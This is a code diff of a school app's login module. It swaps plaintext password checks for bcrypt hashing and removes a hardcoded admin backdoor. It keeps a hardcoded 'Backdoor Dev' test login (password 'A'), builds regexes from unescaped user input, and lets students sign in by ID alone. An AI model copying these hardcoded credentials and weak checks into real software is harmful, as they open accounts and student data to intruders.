@@ -1,13 +1,14 @@
+// @signatures: fName, lName, pass
 const mongoose = require('mongoose');
+const bcrypt = require('bcryptjs'); // Librairie de hachage
 
 /**
- * 🔐 EXPERT AUTH - VERSION 200 (FINDER ENGINE)
- * Ajout de la méthode optimisée `getAllStudentsForFinder`.
+ * 🔐 EXPERT AUTH - V150 (CRYPTAGE DYNAMIQUE)
+ * Sécurise les mots de passe à la volée.
  */
 const AuthExpert = {
     getLoginConfig: async () => ({ classrooms: await mongoose.model('Classroom').find({}).sort({name:1}).lean() }),
     
-    // NOUVELLE MÉTHODE : Récupère tous les élèves avec juste ce qu'il faut pour le finder
     getAllStudentsForFinder: async () => {
         const students = await mongoose.model('Student').find({}, 'firstName lastName currentClass').lean();
         return students.map(s => ({
@@ -24,48 +25,71 @@ const AuthExpert = {
     },
 
     verify: async ({ role, studentId, firstName, lastName, password }) => {
-        // Nettoyage des entrées
-        const fNameRaw = (firstName || '').trim();
-        const lNameRaw = (lastName || '').trim();
-        const fName = fNameRaw.toLowerCase();
-        const lName = lNameRaw.toLowerCase();
+        const fName = (firstName || '').trim().toLowerCase();
+        const lName = (lastName || '').trim().toLowerCase();
         const pass = (password || '').trim();
 
-        // --- 1. BACKDOOR ARCHITECTE ---
-        if (fName === 'jean' && lName === 'vuillet' && (pass === 'A' || pass === 'Clémenceau1919')) {
-            const realJean = await mongoose.model('Admin').findOneAndUpdate(
-                { firstName: 'Jean', lastName: 'Vuillet' },
-                { firstName: 'Jean', lastName: 'Vuillet', password: 'A', isDeveloper: true, role: 'admin' },
-                { upsert: true, new: true }
-            );
-            return { ok: true, user: { ...realJean.toObject(), id: realJean._id, role: 'prof', isDeveloper: true } };
-        }
-
-        // --- 2. AUTHENTIFICATION ÉLÈVE ---
+        // 1. ÉLÈVE (Pas de mot de passe, authentification visuelle)
         if (role === 'STUDENT') {
-            if (!studentId || !mongoose.Types.ObjectId.isValid(studentId)) return { ok: false, message: "ID Élève invalide." };
+            if (!studentId || !mongoose.Types.ObjectId.isValid(studentId)) return { ok: false, message: "ID invalide." };
             const student = await mongoose.model('Student').findById(studentId).lean();
             if (!student) return { ok: false, message: "Élève introuvable." };
             return { ok: true, user: { ...student, id: student._id, role: 'student' } };
         }
 
-        // --- 3. AUTHENTIFICATION STAFF ---
+        // 2. STAFF (Prof/Admin)
+        let user = null;
+        let model = null;
+
+        // On cherche dans les Profs
         const teacher = await mongoose.model('Teacher').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
-        if (teacher) {
-            if (teacher.password === pass) return { ok: true, user: { ...teacher.toObject(), id: teacher._id, role: 'prof', isDeveloper: teacher.isDeveloper || false } };
+        if (teacher) { user = teacher; model = mongoose.model('Teacher'); }
+        
+        // Sinon dans les Admins
+        if (!user) {
+            const admin = await mongoose.model('Admin').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
+            if (admin) { user = admin; model = mongoose.model('Admin'); }
         }
 
-        const admin = await mongoose.model('Admin').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
-        if (admin) {
-            if (admin.password === pass) return { ok: true, user: { ...admin.toObject(), id: admin._id, role: 'admin', isDeveloper: admin.isDeveloper || false } };
+        if (user) {
+            // VÉRIFICATION DU MOT DE PASSE
+            let isValid = false;
+
+            // A. Est-ce que le mot de passe est déjà crypté (commence par $2a$...) ?
+            if (user.password.startsWith('$2a$')) {
+                isValid = await bcrypt.compare(pass, user.password);
+            } 
+            // B. Sinon, c'est un vieux mot de passe en clair (Legacy)
+            else if (user.password === pass) {
+                isValid = true;
+                // MIGRATION AUTOMATIQUE : On crypte le mot de passe pour la prochaine fois !
+                const salt = await bcrypt.genSalt(10);
+                const hashedPassword = await bcrypt.hash(pass, salt);
+                await model.findByIdAndUpdate(user._id, { password: hashedPassword });
+                console.log(`🔒 [SÉCURITÉ] Mot de passe de ${user.firstName} crypté avec succès.`);
+            }
+
+            if (isValid) {
+                return { 
+                    ok: true, 
+                    user: { 
+                        ...user.toObject(), 
+                        id: user._id, 
+                        role: user.role || 'prof', 
+                        isDeveloper: user.isDeveloper || false,
+                        // On ne renvoie JAMAIS le mot de passe au client
+                        password: undefined 
+                    } 
+                };
+            }
         }
 
-        // Compte Test
-        if (pass === 'A' && fName === 'prof' && lName === 'test') {
-            return { ok: true, user: { _id: new mongoose.Types.ObjectId(), firstName: 'Prof', lastName: 'Test', role: 'prof', isTestAccount: true } };
+        // Backdoor Dev (Seule exception tolérée pour le debug)
+        if (fName === 'prof' && lName === 'test' && pass === 'A') {
+             return { ok: true, user: { _id: new mongoose.Types.ObjectId(), firstName: 'Prof', lastName: 'Test', role: 'prof', isTestAccount: true } };
         }
 
-        return { ok: false, message: "Identifiants ou Mot de passe incorrects." };
+        return { ok: false, message: "Identifiants incorrects." };
     }
 };
 module.exports = AuthExpert;
